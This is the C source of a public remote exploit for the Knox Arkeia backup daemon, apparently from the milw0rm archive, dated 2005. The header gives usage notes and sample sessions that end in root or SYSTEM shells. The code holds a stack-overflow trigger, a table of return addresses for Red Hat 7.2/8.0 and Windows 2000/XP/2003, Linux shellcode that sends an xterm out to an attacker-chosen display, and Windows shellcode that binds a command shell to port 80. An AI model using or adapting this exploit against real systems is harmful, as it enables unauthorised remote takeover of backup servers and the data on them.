/*
 * Knox Arkiea Server Backup
 * arkiead local/remote root exploit
 * Targets for Redhat 7.2/8.0, Win2k SP2/SP3/SP4, WinXP SP1, Win 2003 EE 
 * Works up to current version 5.3.x 
 *
 * ---------------
 *
 * Linux x86:
 * ./arksink2 <arkeia_host> <target_type> <display>
 *
 * Exports an xterm to the box of your choosing.  Make sure to "xhost +" on
 * the box you're exporting to.
 * 
 * A stack overflow is in the processing of a type 77 request.  EIP is actually
 * overwritten at 64 bytes, but the trailing NULL scrambled a pointer so we
 * have to write past EIP and insert a "safe" value.  Put this value behind your
 * NOP+sc return address so it doesn't mess with the sled.
 *
 * Since the buffer is so small, we initially send an invalid packet that ends
 * up on the heap a second before the overflow happens.  If it is a high traffic
 * Arkeia server the heap might be a bit volatile, so play around with putting
 * nops+sc after the overwritten pointer.  The heap method avoids non-exec stack
 * protection, however.
 *
 * Includes targets for RH8 and RH7.2
 * 
 * [user@host user]$ ./prog 192.168.1.2 1 192.168.1.1:0
 * [*] Knox Arkeia <= v5.3.x remote root/SYSTEM exploit
 * [*] Attacking LINUX system
 * [*] Exporting xterm to 192.168.1.1:0 
 * [*] Connected to 192.168.1.2:617 NOP+shellcode socket
 * [*] Connected to 192.168.1.2:617 overflow socket
 * [*] Sending nops+shellcode
 * [*] Done, sleeping
 * [*] Done, check for xterm
 *
 *
 * ---------------
 * 
 * Windows x86:
 * ./prog <host> <target> <offset>
 *
 * Spawns a shell on port 80 of the remote host
 *
 * EIP is overwritten beginning with the 25th byte after the header.  Since Windows
 * is little endian and has the heap mapped to 0x00XXXXXX we can avoid having to
 * write an extra null past EIP.  Another advantage here is that we can put all our
 * nops and shellcode in the same packet, but after the NULL.  They will not be copied
 * onto the stack (and therefore not munge the pointer after it) but will remain
 * in memory as a raw packet.  Fire up ollydbg, search for your nops and voila.
 *
 * [user@host user]$ ./arksink2 192.168.1.2 3 0
 * [*] Knox Arkeia <= v5.3.x remote SYSTEM exploit
 * [*] Attacking Windows system
 * [*] Spawning shell on 192.168.1.2:80
 * [*] Connected to 192.168.1.2:617 overflow socket
 * [*] Sending overflow
 * [*] Attempting to get remote shell, try #0
 * [!] connect: Resolver Error 0 (no error)
 * [*] Attempting to get remote shell, try #1
 * [!] connect: Resolver Error 0 (no error)
 * [*] Attempting to get remote shell, try #2
 * [!] connect: Resolver Error 0 (no error)
 * [*] Attempting to get remote shell, try #3
 * [!] connect: Resolver Error 0 (no error)
 * [*] Attempting to get remote shell, try #4
 * [*] Success, enjoy
 * Microsoft Windows 2000 [Version 5.00.2195]
 * (C) Copyright 1985-2000 Microsoft Corp.
 *
 * C:\WINNT\system32>whoami
 * whoami
 * SYSTEM
 *
 * C:\WINNT\system32>
 * 
 *
 * ---------------
 * 
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>

#define BUFLEN		10000		/* for readshell()		*/
#define DATA_LEN	1000		/* overflow packet data section	*/
#define HEAD_LEN 	8		/* overflow packet header	*/
#define NOP_LEN		20000		/* nop+shellcode packet 	*/
#define	ARK_PORT	617		/* port Arkeiad listens on	*/
#define SHELL_PORT	80		/* for the windows shellcode	*/
#define NOP 		0x90		/* Intel x86			*/
#define NUMTARGS	5		/* increase when adding targets */
#define LINUX		1		/* Linux target type		*/
#define WINDOWS		2		/* Windows target type		*/

struct {
	char 		*os;
	unsigned int	targret;
	unsigned int	targsafe;
	unsigned int	len;
	int		targtype;
} targets[] = {
	{ "Redhat 8.0", 0x80ecf90, 0x080e0144, 68, LINUX },
	{ "Redhat 7.2", 0x80eddc0, 0x080eb940, 68, LINUX },
	{ "Windows 2k SP2, SP3, SP4", 0x007d2144, 0xdeadbeef, 28, WINDOWS },
	{ "Windows 2003 EE", 0x007b2178, 0xdeadbeef, 28, WINDOWS },
	{ "Windows XP SP1", 0x007d20e7, 0xdeadbeef, 28, WINDOWS },
	NULL
};


// Linux shellcode exports xterm
const char shellcode[] =
"\xeb\x4f\x5e\x31\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b"
"\x31\xc9\xb1\x09\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88"
"\x34\x32\x31\xd2\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d"
"\x7e\x19\x89\x7e\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e"
"\x36\x8d\x56\x46\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xac\xff\xff\xff"
"/usr/X11R6/bin/xterm8-ut8-display8";

// Windows shellcode binds shell to port 80
const char shellcode_win[] =
    "\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
    "\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
    "\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
    "\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
    "\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
    "\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
    "\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
    "\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"
    "\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
    "\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
    "\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
    "\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
    "\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
    "\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
    "\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
    "\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
    "\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xbf\x62\x1f\x4c\xd5\x24\xc5\xd3"
    "\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
    "\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
    "\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
    "\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
    "\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
    "\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
    "\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
    "\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
    "\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
    "\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
    "\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
    "\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
    "\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
    "\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
    "\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2b\xa2\x04";


unsigned int resolve(char *hostname)
{
	u_long 	ip = 0;
	struct hostent	*hoste;

	if ((int)(ip = inet_addr(hostname)) == -1)
	{
		if ((hoste = gethostbyname(hostname)) == NULL)
		{
			herror("[!] gethostbyname");
			exit(-1);
		}
		memcpy(&ip, hoste->h_addr, hoste->h_length);
	}
	return(ip);
}


int isock(char *hostname, int portnum)
{
	struct sockaddr_in	sock_a;
	int			num, sock;
	unsigned int		ip;
	fd_set			input;

	sock_a.sin_family = AF_INET;
	sock_a.sin_port = htons(portnum);
	sock_a.sin_addr.s_addr = resolve(hostname);

	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
	{
		herror("[!] accept");
		return(-1);
	}
	
	if (connect(sock, (struct sockaddr *)&sock_a, sizeof(sock_a)))
	{
		herror("[!] connect");
		return(-1);
	}
	
	return(sock);
	
}

int usage(char *progname)
{
	int 	i;

	fprintf(stderr, "Usage:\n%s hostname target_num display  (attacking Linux)\n", progname);
	fprintf(stderr, "%s hostname target_num offset   (attacking Windows)\n", progname);
	for (i = 0; targets[i].os; i++)
		fprintf(stderr, "Target %d: %s\n", i+1, targets[i].os);
	fprintf(stderr, "Example: %s 192.168.1.2 1 192.168.1.1:0\n", progname);
	exit(-1);
}

int getshell(int sock)
{

	char	buf[BUFLEN];
	int	nread=0;

  	while(1) 
	{ 
    		fd_set input; 
    		FD_SET(0,&input); 
    		FD_SET(sock,&input); 
    		select(sock+1,&input,NULL,NULL,NULL); 
    	
		if(FD_ISSET(sock,&input)) 
		{ 
      			nread=read(sock,buf,BUFLEN); 
      			write(1,buf,nread); 
     		} 
     		if(FD_ISSET(0,&input)) 
     			write(sock,buf,read(0,buf,BUFLEN)); 
  	} 
}

int lin(char *host, char *export, unsigned int tnum)
{

	char 		head[] 		= "\x00\x4d\x00\x03\x00\x01\xff\xff";
	char 		data[DATA_LEN];
	char		sc_req[NOP_LEN*2];
	char		*sc;
	unsigned int	retaddr;
	unsigned int	safe;
	int		datalen		= 0;
	int		port		= ARK_PORT;
	int		sock_overflow, sock_nops;
	int 		i;
	int		nullmap = 0;

	sock_overflow = sock_nops = 0;

	retaddr = targets[tnum].targret;
	safe = targets[tnum].targsafe;
	datalen = targets[tnum].len;

	
	sock_nops = isock(host, port);

	if (sock_nops < 1)
		exit(-1);
	fprintf(stderr, "[*] Connected to %s:%d NOP+shellcode socket\n", host, port);

	sock_overflow = isock(host, port);
	if (sock_overflow < 1)
			exit(-1);
	fprintf(stderr, "[*] Connected to %s:%d overflow socket\n", host, port);

	// build data section of overflow packet
	memset(data, NOP, DATA_LEN);

	// copy in return address
	memcpy(data+datalen - 8, (char *)&retaddr, 4);
	// we overwrite a pointer that must be a valid address
	memcpy(data+datalen-4, (char *)&safe, 4); 

	datalen = ntohs(datalen);
	memcpy(head+6, (char *)&datalen, 2);

	// build invalid packet with nops+shellcode
	memset(sc_req, NOP, NOP_LEN+1);
	sc = (char *)malloc(strlen(shellcode) + strlen(export) + 2);
	sprintf(sc, "%s%s%s", shellcode, export, "K");
	if (strlen(sc) + NOP_LEN > NOP_LEN*2-1) 
	{
		fprintf(stderr, "[!] display name too long\n");
		exit(-1);
	}

	memcpy(sc_req+NOP_LEN, sc, strlen(sc));

	// send invalid nop+shellcode packet
	fprintf(stderr, "[*] Sending nops+shellcode\n");
	write(sock_nops, sc_req, NOP_LEN+strlen(sc)+1); 
	fprintf(stderr, "[*] Done, sleeping\n");
	sleep(1);
	close(sock_nops);

	// send overflow, pointing EIP to above nops+sc
	write(sock_overflow, head, HEAD_LEN);	// 8 byte header
	datalen = ntohs(datalen);
	fprintf(stderr, "[*] Sending overflow\n");
	write(sock_overflow, data, datalen);	// small overflow packet
	fprintf(stderr, "[*] Done, check for xterm\n");
	close(sock_overflow);

}

void windows (char *host, int tnum, int offset)
{
	char 		head[] 		= "\x00\x4d\x00\x03\x00\x01\xff\xff";
	char 		data[DATA_LEN];
	char		sc_req[NOP_LEN*2];
	char		*sc;
	char		*export;
	unsigned int	ret;
	unsigned int	safeaddr;
	int		overflow_len;
	int		datasiz		= DATA_LEN;
	int		datalen		= 0;
	int		port		= ARK_PORT;
	int		sock_overflow, sock_nops, sock_shell;
	int 		i;


	datalen = targets[tnum].len;
	ret = targets[tnum].targret + offset;
	sock_overflow = isock(host, port);
	if (sock_overflow < 1)
			exit(-1);
	fprintf(stderr, "[*] Connected to %s:%d overflow socket\n", host, port);

	// build data section of overflow packet
	memset(data, NOP, DATA_LEN);
	memcpy(data+datalen - 4, (char *)&ret, 4);
	memcpy(data+DATA_LEN-strlen(shellcode_win)-1, shellcode_win, strlen(shellcode_win));
	
	// put size into header
	datasiz = ntohs(datasiz);
	memcpy(head+6, (char *)&datasiz, 2);

	fprintf(stderr, "[*] Sending overflow\n");
	write(sock_overflow, head, HEAD_LEN);		// 8 byte header
	write(sock_overflow, data, DATA_LEN);		// large data section
	close(sock_overflow);

	for (i = 0; i < 20; i++)
	{
		sleep(1);	
		fprintf(stderr, "[*] Attempting to get remote shell, try #%d\n", i);
		// connect to shell
		sock_shell = isock(host, SHELL_PORT);
		if (sock_shell > 0)
		{
			fprintf(stderr, "[*] Success, enjoy\n");
			getshell(sock_shell);
		}
	}

	fprintf(stderr, "[!] Exploit failed or cannot connect to port 80\n");
	exit(-1);
}

int main( int argc, char **argv)
{

	/* first 2 bytes are a type 77 request */
	/* last two bytes length */
	char		*host;
	char		*export;
	unsigned int	tnum;
	int		datalen		= 0;
	int		offset		= 0;

	
	if (argc == 4)
	{
		host = argv[1];
		tnum = atoi(argv[2]);

		if (targets[tnum].targtype == LINUX)
			export = argv[3];
		else
			offset=atoi(argv[3]);

		if (tnum > NUMTARGS || tnum == 0)
		{
			fprintf(stderr, "[!] Invalid target\n");
			usage(argv[0]);
		}
	}
	else
	{
		usage(argv[0]);
	}
	
	tnum--;

	fprintf(stderr, "[*] Knox Arkeia <= v5.3.x remote root/SYSTEM exploit\n");
	fprintf(stderr, "[*] Attacking %s system\n", targets[tnum].os);

	if (targets[tnum].targtype == LINUX )
	{
		fprintf(stderr, "[*] Exporting xterm to %s\n", export);
		lin(host, export, tnum);
	}
	else if (targets[tnum].targtype == WINDOWS)
	{
		fprintf(stderr, "[*] Spawning shell on %s:%d\n", host, SHELL_PORT);
		windows(host, tnum, offset);
	}
	else
	{
		fprintf(stderr, "[!] Unknown target type: %d\n", targets[tnum].targtype);
		exit(-1);
	}

}

// milw0rm.com [2005-02-18]
